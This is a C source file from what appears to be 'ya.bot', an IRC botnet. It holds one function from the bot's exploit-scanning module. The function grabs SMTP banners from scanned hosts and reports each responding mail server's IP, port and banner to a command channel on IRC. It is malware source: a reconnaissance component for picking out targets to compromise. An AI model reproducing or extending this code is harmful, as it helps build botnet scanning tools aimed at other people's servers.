/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_EXPSCAN
#ifndef NO_EXPSCANSMTP
bool expscan_smtp(SExpScanInfo s_esi)
{
	char szBuffer[LOWBUF];
	int i;

#ifndef NO_DEBUG
		debug_print("Exploit scanning smtp, expscan_smtp()");
#endif

	if (s_esi.m_csock == INVALID_SOCKET)
			return FALSE;
	if (expscan_recv(s_esi.m_csock, szBuffer, sizeof(szBuffer) - 1, 0) == SOCKET_ERROR)
			return FALSE;
	if ((szBuffer[0] != '2') && (szBuffer[1] != '2') && (szBuffer[2] != '0'))
			return FALSE;
	for (i = 0; i < (int)strlen(szBuffer); i++)
		if ((szBuffer[i] == '\r') || (szBuffer[i] == '\n'))
				szBuffer[i] = '\x20';
	if (!s_esi.m_bSilent)
			irc_message(s_esi.m_bsock, (char *)string_ircprivmsg, s_esi.m_szResultChannel,
					(char *)string_expscansmtpdaemonfound,
					CGREEN, string_replyexpscan, CEND, string_replydotbot,
					CBLUE, CEND, s_esi.m_szIP, s_esi.m_nPort,
					szBuffer);
		return TRUE;
}
#endif
#endif